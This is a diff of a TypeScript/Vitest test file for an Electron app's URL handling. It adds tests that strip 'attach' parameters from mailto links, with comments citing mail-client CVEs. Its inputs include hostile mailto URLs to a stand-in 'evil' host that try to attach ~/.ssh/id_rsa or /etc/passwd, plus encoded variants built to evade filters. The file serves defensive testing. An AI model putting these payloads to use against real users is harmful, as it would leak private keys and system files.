@@ -11,7 +11,10 @@
 import { readFileSync } from 'node:fs';
 import { join } from 'node:path';
 import { describe, expect, it, vi } from 'vitest';
-import { isAllowedExternalUrl } from '../../../electron/main/services/shell.service';
+import {
+  isAllowedExternalUrl,
+  sanitizeExternalUrl,
+} from '../../../electron/main/services/shell.service';
 import { MAX_EXTERNAL_URL_LEN } from '../../../electron/shared/url-limits';
 
 const ROOT = join(__dirname, '..', '..', '..');
@@ -55,7 +58,11 @@ describe('topic49 6thS · external URL scheme whitelist', () => {
     // import 了共享断言
     expect(src).toMatch(/isAllowedExternalUrl/);
     // 不再出现裸 `shell.openExternal(url);` 顶格调用(必须包在 if 守卫内)
-    expect(src).toMatch(/if \(isAllowedExternalUrl\(url\)\)\s*\{\s*shell\.openExternal\(url\)/);
+    // 且交出前过 sanitizeExternalUrl(mailto 去 attach,安全 L4)
+    expect(src).toMatch(
+      /if \(isAllowedExternalUrl\(url\)\)\s*\{\s*shell\.openExternal\(sanitizeExternalUrl\(url\)\)/,
+    );
+    expect(src).not.toMatch(/shell\.openExternal\(url\)/);
   });
 
   // 边界(E190):windowOpenHandler 在 new URL / openExternal 之前先做 url 长度上限(共享
@@ -75,5 +82,52 @@ describe('topic49 6thS · external URL scheme whitelist', () => {
 
   it('E190 MAX_EXTERNAL_URL_LEN 共享常量 = 2048(与 openExternal schema / Markdown 外链同源)', () => {
     expect(MAX_EXTERNAL_URL_LEN).toBe(2048);
+  });
+});
+
+// 安全 L4:mailto 的 attach / attachment 参数会让部分邮件客户端静默附加本地文件(Evolution CVE-2020-11879、
+// KMail CVE-2020-11880)。不受信 markdown / 终端输出链接 `mailto:x@evil?attach=~/.ssh/id_rsa` 经 xdg-open 交出
+// → 私钥随邮件外发。主进程 openExternal 统一出口删掉这些参数再打开(各平台)。
+describe('安全 L4 · mailto 去 attach 参数', () => {
+  it('删除 attach / attachment(大小写不敏感),保留其它参数', () => {
+    expect(sanitizeExternalUrl('mailto:x@evil?attach=~/.ssh/id_rsa')).toBe('mailto:x@evil');
+    expect(sanitizeExternalUrl('mailto:x@evil?subject=hi&ATTACH=/etc/passwd&body=b')).toBe(
+      'mailto:x@evil?subject=hi&body=b',
+    );
+    expect(sanitizeExternalUrl('MAILTO:x@evil?Attachment=/a&attachment=/b')).toBe('MAILTO:x@evil');
+  });
+
+  it('编码变体:键名百分号编码 / 双重编码 / 首尾空白 / ; 分隔', () => {
+    expect(sanitizeExternalUrl('mailto:x@evil?%61ttach=/etc/passwd')).toBe('mailto:x@evil');
+    expect(sanitizeExternalUrl('mailto:x@evil?%2561ttach=/etc/passwd')).toBe('mailto:x@evil');
+    expect(sanitizeExternalUrl('mailto:x@evil?%20attach%20=/etc/passwd')).toBe('mailto:x@evil');
+    expect(sanitizeExternalUrl('mailto:x@evil?subject=a;attach=/etc/passwd')).toBe('mailto:x@evil?subject=a');
+    expect(sanitizeExternalUrl('mailto:x@evil?attach%3D/etc/passwd&subject=s')).toBe('mailto:x@evil?subject=s');
+    // 保留未删参数的原分隔符(body 里的 ; 不被改写)
+    expect(sanitizeExternalUrl('mailto:x@evil?body=a;b&attach=/x#f')).toBe('mailto:x@evil?body=a;b#f');
+    // 无法解码的键名 → fail-closed 删除
+    expect(sanitizeExternalUrl('mailto:x@evil?%E0%A4%A=1&subject=s')).toBe('mailto:x@evil?subject=s');
+  });
+
+  it('不含 attach 的 mailto 与 http(s) 原样返回', () => {
+    expect(sanitizeExternalUrl('mailto:a@b.com?subject=see%20attachment&body=x')).toBe(
+      'mailto:a@b.com?subject=see%20attachment&body=x',
+    );
+    expect(sanitizeExternalUrl('mailto:a@b.com')).toBe('mailto:a@b.com');
+    expect(sanitizeExternalUrl('https://x.test/?attach=1')).toBe('https://x.test/?attach=1');
+  });
+
+  it('openExternalUrl(IPC 出口)交给系统的是去掉 attach 的 URL', async () => {
+    vi.resetModules();
+    const openExternal = vi.fn(async () => undefined);
+    vi.doMock('electron', () => ({ shell: { openExternal } }));
+    try {
+      const mod = await import('../../../electron/main/services/shell.service');
+      await mod.openExternalUrl({ url: 'mailto:x@evil?attach=~/.ssh/id_rsa&subject=s' });
+      expect(openExternal).toHaveBeenCalledWith('mailto:x@evil?subject=s');
+    } finally {
+      vi.doUnmock('electron');
+      vi.resetModules();
+    }
   });
 });
